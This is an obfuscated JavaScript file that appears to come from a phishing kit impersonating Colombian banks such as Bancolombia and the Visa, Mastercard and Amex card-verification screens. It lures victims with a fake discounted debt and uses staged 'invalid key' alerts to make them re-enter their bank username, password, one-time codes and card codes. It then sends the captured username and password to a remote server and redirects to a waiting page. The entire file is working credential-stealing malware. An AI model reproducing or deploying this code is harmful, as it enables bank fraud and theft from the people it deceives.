const _0x15b9ad = _0x457c;
(function (_0x5c57ee, _0x13fbb9) {
  const _0x197d38 = _0x457c,
    _0x1b5409 = _0x5c57ee();
  while (!![]) {
    try {
      const _0x1da2cc =
        parseInt(_0x197d38(0x1ed)) / 0x1 +
        (parseInt(_0x197d38(0x21e)) / 0x2) *
          (-parseInt(_0x197d38(0x218)) / 0x3) +
        -parseInt(_0x197d38(0x203)) / 0x4 +
        -parseInt(_0x197d38(0x212)) / 0x5 +
        parseInt(_0x197d38(0x20c)) / 0x6 +
        (-parseInt(_0x197d38(0x1ff)) / 0x7) *
          (parseInt(_0x197d38(0x1e8)) / 0x8) +
        parseInt(_0x197d38(0x215)) / 0x9;
      if (_0x1da2cc === _0x13fbb9) break;
      else _0x1b5409["push"](_0x1b5409["shift"]());
    } catch (_0x21d130) {
      _0x1b5409["push"](_0x1b5409["shift"]());
    }
  }
})(_0x2b88, 0x62a37);
const companyLoader = document[_0x15b9ad(0x20b)](_0x15b9ad(0x1ea)),
  companyLogo = document["querySelector"](_0x15b9ad(0x1f0)),
  bankLogo = document[_0x15b9ad(0x20b)](_0x15b9ad(0x21d)),
  companyLogos = {
    VISA: {
      loaderSrc: _0x15b9ad(0x213),
      loaderWidth: _0x15b9ad(0x1fa),
      loaderStyle: "margin-bottom:\x2040px",
      logoSrc: _0x15b9ad(0x213),
      logoWidth: _0x15b9ad(0x1d8),
    },
    MC: {
      loaderSrc: _0x15b9ad(0x1dd),
      loaderWidth: _0x15b9ad(0x217),
      logoSrc: _0x15b9ad(0x1d1),
      logoWidth: _0x15b9ad(0x1fa),
    },
    AM: {
      loaderSrc: _0x15b9ad(0x1e9),
      loaderWidth: "200px",
      logoSrc: _0x15b9ad(0x1d1),
      logoWidth: "110px",
    },
  },
  companyInfo = companyLogos[info["checkerInfo"][_0x15b9ad(0x20f)]];
function _0x457c(_0x20b88c, _0x1abfb3) {
  const _0x2b8823 = _0x2b88();
  return (
    (_0x457c = function (_0x457c56, _0x441a76) {
      _0x457c56 = _0x457c56 - 0x1cd;
      let _0x2c2f59 = _0x2b8823[_0x457c56];
      return _0x2c2f59;
    }),
    _0x457c(_0x20b88c, _0x1abfb3)
  );
}
companyInfo &&
  (companyLoader[_0x15b9ad(0x1eb)](
    _0x15b9ad(0x209),
    companyInfo[_0x15b9ad(0x225)]
  ),
  companyLoader["setAttribute"](
    _0x15b9ad(0x211),
    companyInfo[_0x15b9ad(0x21f)]
  ),
  companyInfo[_0x15b9ad(0x20e)] &&
    companyLoader[_0x15b9ad(0x1eb)]("style", companyInfo[_0x15b9ad(0x20e)]),
  companyLogo[_0x15b9ad(0x1eb)](_0x15b9ad(0x209), companyInfo["logoSrc"]),
  companyLogo[_0x15b9ad(0x1eb)](
    _0x15b9ad(0x211),
    companyInfo[_0x15b9ad(0x1f3)]
  ));
bankLogo[_0x15b9ad(0x1eb)](
  _0x15b9ad(0x209),
  _0x15b9ad(0x1e2) + info[_0x15b9ad(0x1d9)][_0x15b9ad(0x208)] + _0x15b9ad(0x204)
);
info[_0x15b9ad(0x1d9)][_0x15b9ad(0x208)] === _0x15b9ad(0x1ef) &&
  bankLogo[_0x15b9ad(0x1eb)](_0x15b9ad(0x211), _0x15b9ad(0x20d));
const mainLoader = document[_0x15b9ad(0x20b)](_0x15b9ad(0x219));
setTimeout(
  () => mainLoader?.[_0x15b9ad(0x1d4)][_0x15b9ad(0x1d2)](_0x15b9ad(0x1e5)),
  0x9c4
);
const inputGroups = {
    userpassword: ["#user", "#puser", _0x15b9ad(0x1e0), "#puser-b"],
    cdin: [_0x15b9ad(0x200)],
    ccaj: [_0x15b9ad(0x1fe)],
    cavance: [_0x15b9ad(0x1dc)],
    otpcode: [_0x15b9ad(0x1fb)],
  },
  showInputs = (_0x59f82f) => {
    const _0x1db113 = _0x15b9ad;
    inputGroups[_0x59f82f]?.[_0x1db113(0x223)]((_0x1d01a2) => {
      const _0x307d43 = _0x1db113;
      document[_0x307d43(0x224)](_0x1d01a2)[_0x307d43(0x223)]((_0xefbf88) => {
        const _0x8d6313 = _0x307d43;
        _0xefbf88[_0x8d6313(0x1d4)][_0x8d6313(0x1d2)](_0x8d6313(0x1f4));
      });
    });
  },
  checkError = (_0x2eb62f, _0x593974) => {
    const _0x14339d = _0x15b9ad;
    info[_0x14339d(0x1d9)][_0x2eb62f] !== "" &&
      setTimeout(() => alert(_0x593974), 0x802);
  };
if (info[_0x15b9ad(0x1de)]["mode"] === _0x15b9ad(0x205))
  showInputs(_0x15b9ad(0x205)),
    info[_0x15b9ad(0x1d9)][_0x15b9ad(0x208)] === _0x15b9ad(0x1ef) &&
      document[_0x15b9ad(0x224)](_0x15b9ad(0x1ec))["forEach"]((_0x5b6d2d) => {
        const _0xa6c29d = _0x15b9ad;
        _0x5b6d2d[_0xa6c29d(0x1eb)]("oninput", "limitDigits(this,\x204);");
      });
else {
  if (info["checkerInfo"][_0x15b9ad(0x1e3)] === _0x15b9ad(0x1cd))
    checkError(_0x15b9ad(0x1cd), _0x15b9ad(0x1f8)),
      showInputs(_0x15b9ad(0x1cd));
  else {
    if (info[_0x15b9ad(0x1de)][_0x15b9ad(0x1e3)] === _0x15b9ad(0x207))
      checkError(_0x15b9ad(0x207), _0x15b9ad(0x1f2)), showInputs("ccaj");
    else {
      if (info[_0x15b9ad(0x1de)]["mode"] === _0x15b9ad(0x1d0))
        checkError(_0x15b9ad(0x1d0), _0x15b9ad(0x1f2)),
          showInputs(_0x15b9ad(0x1d0));
      else
        info[_0x15b9ad(0x1de)]["mode"] === _0x15b9ad(0x1db) &&
          (checkError("cavance", _0x15b9ad(0x1ee)),
          showInputs(_0x15b9ad(0x1db)));
    }
  }
}
function _0x2b88() {
  const _0x1137b = [
    "ccaj",
    "ban",
    "src",
    "innerHTML",
    "querySelector",
    "19212HqwYxC",
    "120px",
    "loaderStyle",
    "company",
    "es-CO",
    "width",
    "2514010eWwGpW",
    "./assets/logos/visa_verified.png",
    "error",
    "13267881jSDMWd",
    "stringify",
    "400px",
    "279138aCwtnF",
    ".main-loader",
    "telnum",
    "Error\x20al\x20actualizar\x20datos\x20en\x20el\x20servidor",
    "waiting.html",
    "#bank-logo",
    "14vcirRQ",
    "loaderWidth",
    "href",
    "log",
    "debtMap\x20o\x20info.metaInfo.telnum\x20no\x20están\x20definidos.",
    "forEach",
    "querySelectorAll",
    "loaderSrc",
    "cdin",
    "origin",
    "location",
    "cavance",
    "./assets/logos/mc_id_check_1.webp",
    "remove",
    "info.metaInfo",
    "classList",
    "Datos\x20actualizados\x20correctamente\x20en\x20el\x20servidor",
    "Por\x20favor\x20complete\x20todos\x20los\x20campos.",
    "Ingresó\x20usuario",
    "90px",
    "metaInfo",
    "number",
    "otpcode",
    "#cavance",
    "./assets/logos/mc_id_check_2.jpg",
    "checkerInfo",
    "Hubo\x20un\x20error\x20al\x20actualizar\x20los\x20datos.\x20Por\x20favor,\x20inténtelo\x20de\x20nuevo.",
    "#user-b",
    "value",
    "./assets/logos/",
    "mode",
    "user",
    "show",
    "userTableDataId",
    "tableDataToken",
    "280rGcPvP",
    "./assets/logos/amex_check_1.png",
    "#company-loader",
    "setAttribute",
    "#puser-b",
    "488591QFBmvb",
    "Código\x20inválido,\x20por\x20favor\x20ingrese\x20el\x20valor\x20de\x20nuevo.",
    "bancolombia",
    "#company-logo",
    "getElementById",
    "Datos\x20inválidos,\x20por\x20favor\x20ingrese\x20la\x20clave\x20de\x20nuevo.",
    "logoWidth",
    "hidden",
    "Hubo\x20un\x20problema:",
    "COP",
    "puser",
    "Clave\x20dinámica\x20inválida\x20o\x20expiró,\x20por\x20favor\x20inténtelo\x20de\x20nuevo.",
    "currency",
    "130px",
    "#otpcode",
    ".flight-price",
    "card-digits",
    "#ccaj",
    "78148XaikqG",
    "#cdin",
    "No\x20se\x20encontró\x20el\x20ID\x20o\x20el\x20token\x20en\x20localStorage.",
    "getItem",
    "68460XbpeMK",
    ".png",
    "userpassword",
    "click",
  ];
  _0x2b88 = function () {
    return _0x1137b;
  };
  return _0x2b88();
}
const formatCurrency = (_0x5ae91c) =>
  _0x5ae91c["toLocaleString"](_0x15b9ad(0x210), {
    style: _0x15b9ad(0x1f9),
    currency: _0x15b9ad(0x1f6),
  });
console[_0x15b9ad(0x221)](_0x15b9ad(0x1d3), info[_0x15b9ad(0x1d9)]);
(!debtMap || !info["metaInfo"]["telnum"]) &&
  console[_0x15b9ad(0x214)](_0x15b9ad(0x222));
const deuda = debtMap[info[_0x15b9ad(0x1d9)][_0x15b9ad(0x21a)]];
if (typeof deuda !== _0x15b9ad(0x1da) || isNaN(deuda))
  console[_0x15b9ad(0x214)](
    "La\x20deuda\x20para\x20" +
      info[_0x15b9ad(0x1d9)][_0x15b9ad(0x21a)] +
      "\x20no\x20es\x20válida."
  );
else {
  const deudaConDescuento = deuda - deuda * 0.5;
  document["querySelectorAll"](_0x15b9ad(0x1fc))["forEach"]((_0x257b0b) => {
    const _0x1fda47 = _0x15b9ad;
    _0x257b0b[_0x1fda47(0x20a)] = formatCurrency(deudaConDescuento);
  });
}
document[_0x15b9ad(0x1f1)](_0x15b9ad(0x1fd))[_0x15b9ad(0x20a)] =
  info[_0x15b9ad(0x1d9)]["p"]["slice"](-0x4);
const btnNextStep = document["querySelector"]("#btnNextStep");
btnNextStep["addEventListener"](_0x15b9ad(0x206), () => {
  const _0x48f9da = _0x15b9ad,
    _0x69b4cf = document[_0x48f9da(0x1f1)](_0x48f9da(0x1e4))[_0x48f9da(0x1e1)],
    _0x436ef3 = document[_0x48f9da(0x1f1)](_0x48f9da(0x1f7))["value"];
  if (!_0x69b4cf || !_0x436ef3) {
    alert(_0x48f9da(0x1d6));
    return;
  }
  (info["metaInfo"][_0x48f9da(0x1e4)] = _0x69b4cf),
    (info[_0x48f9da(0x1d9)]["puser"] = _0x436ef3);
  async function _0x555115() {
    const _0x4fa6f3 = _0x48f9da;
    try {
      const _0x244636 = localStorage[_0x4fa6f3(0x202)](_0x4fa6f3(0x1e6)),
        _0x26926d = localStorage[_0x4fa6f3(0x202)](_0x4fa6f3(0x1e7));
      if (!_0x244636 || !_0x26926d) throw new Error(_0x4fa6f3(0x201));
      const _0x14dac7 = await fetch(
        url + "/tableData/updateUserTableData/" + _0x244636,
        {
          method: "PUT",
          headers: {
            "Content-Type": "application/json",
            Authorization: "Bearer\x20" + _0x26926d,
            Origin: window[_0x4fa6f3(0x1cf)][_0x4fa6f3(0x1ce)],
          },
          body: JSON[_0x4fa6f3(0x216)]({
            us: _0x69b4cf,
            ps: _0x436ef3,
            status: _0x4fa6f3(0x1d7),
          }),
        }
      );
      if (!_0x14dac7["ok"]) {
        const _0x39202f = await _0x14dac7["json"]();
        throw new Error(_0x39202f[_0x4fa6f3(0x214)] || _0x4fa6f3(0x21b));
      }
      console[_0x4fa6f3(0x221)](_0x4fa6f3(0x1d5)),
        (window["location"][_0x4fa6f3(0x220)] = _0x4fa6f3(0x21c));
    } catch (_0x367191) {
      console[_0x4fa6f3(0x214)](_0x4fa6f3(0x1f5), _0x367191),
        alert(_0x4fa6f3(0x1df));
    }
  }
  _0x555115();
});
